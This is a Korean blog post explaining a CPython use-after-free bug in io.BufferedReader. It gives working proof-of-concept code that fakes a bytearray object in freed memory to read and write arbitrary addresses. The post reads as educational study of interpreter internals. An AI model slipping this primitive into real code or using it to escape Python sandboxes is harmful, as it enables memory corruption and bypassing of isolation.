---
author: kiwiyou
pubDatetime: 2024-01-19T05:47:51.188Z
title: CPython에서 임의 메모리 읽고 쓰기
slug: unsafe-python
featured: true
draft: false
tags:
  - Python
description: CPython에서 임의 메모리에 접근하는 방법을 소개합니다.
comment: true
---

Python으로 할 수 있는 것들을 찾아보다, [이 글](https://pwn.win/2022/05/11/python-buffered-reader.html)을 보게 되었습니다.
해당 글은 CPython 2.7에서부터 내려온 한 버그를 소개하고 있습니다.

```python
import io

class File(io.RawIOBase):
    def readinto(self, buf):
        global view
        view = buf
    def readable(self):
        return True

f = io.BufferedReader(File())
f.read(1)                       # get view of buffer used by BufferedReader
del f                           # deallocate buffer
view = view.cast('P')
L = [None] * len(view)          # create list whose array has same size
                                # (this will probably coincide with view)
view[0] = 0                     # overwrite first item with NULL
print(L[0])                     # segfault: dereferencing NULL
```

위 코드는 다음과 같이 작동합니다.

1. `BufferedReader`의 내부 버퍼를 가리키는 `memoryview`를 만듭니다.
2. `BufferedReader`와 내부 버퍼를 할당 해제합니다.
3. 내부 버퍼와 같은 길이를 가지도록 리스트를 만듭니다. 리스트가 할당한 공간은 `memoryview`가 가리키는 공간과 일치하게 됩니다.
4. `memoryview`의 첫 번째 값을 0으로 바꾸면, 리스트가 할당한 공간의 첫 번째 값도 0이 됩니다.
5. CPython의 모든 객체는 주소로 관리되므로 리스트의 첫 번째 원소를 가져오려 시도하면 주소 0을 역참조하게 됩니다.

3번 동작은 힙 할당이 가장 최근에 생긴 빈 공간을 재사용하려는 동작에 기인합니다. Use After Free 버그라고도 합니다.

위 코드를 통해 원하는 주소의 값을 CPython 객체로서 불러오는 것이 가능합니다.
따라서 임의의 바이트열을 메모리상에 띄우고 그 주소를 알 수 있다면 임의의 CPython 객체의 모조품을 만들 수 있습니다.

바이트열을 메모리상에 띄우는 것은 `bytes` 클래스를 이용할 수 있습니다.

```c
typedef struct {
    Py_ssize_t ob_refcnt;
    PyTypeObject *ob_type;
    Py_ssize_t ob_size;
    Py_hash_t ob_shash;
    char ob_sval[1];
} PyBytesObject;
```

`PyBytesObject`의 정의를 보면, 실제 바이트열이 32바이트 오프셋을 두고 존재함을 알 수 있습니다.
`bytes` 객체에 원하는 정보를 담고, `id(bytes)+32`를 하면 바이트열의 주소를 알 수 있습니다.

bytes는 불변이므로, 임의 메모리를 수정하기 위해서는 `bytearray` 객체의 모조품을 만들 필요가 있습니다.

```c
typedef struct {
    Py_ssize_t ob_refcnt;
    PyTypeObject *ob_type;
    Py_ssize_t ob_size;
    Py_ssize_t ob_alloc; 
    char *ob_bytes;
    char *ob_start;
    Py_ssize_t ob_exports;
} PyByteArrayObject;
```

`ob_size`는 실제 길이, `ob_alloc`은 할당 길이, `ob_bytes`는 할당 주소, `ob_start`는 실제 시작 주소입니다.
이를 원하는 주소와 길이로 지정해 주면 임의 주소의 메모리를 읽고 쓸 수 있습니다.

```python
import io

class File(io.RawIOBase):
    def readinto(self, buf):
        global view
        view = buf
    def readable(self):
        return True

f = io.BufferedReader(File())
f.read(1)
del f
view = view.cast('P')
L = [None] * len(view)

import struct
my_text = b"Hello World!"
fake_array = struct.pack('nPnnPPn', 9, id(bytearray), len(my_text), len(
    my_text), id(my_text)+32, id(my_text)+32, 0)
view[0] = id(fake_array)+32
print(L[0])
```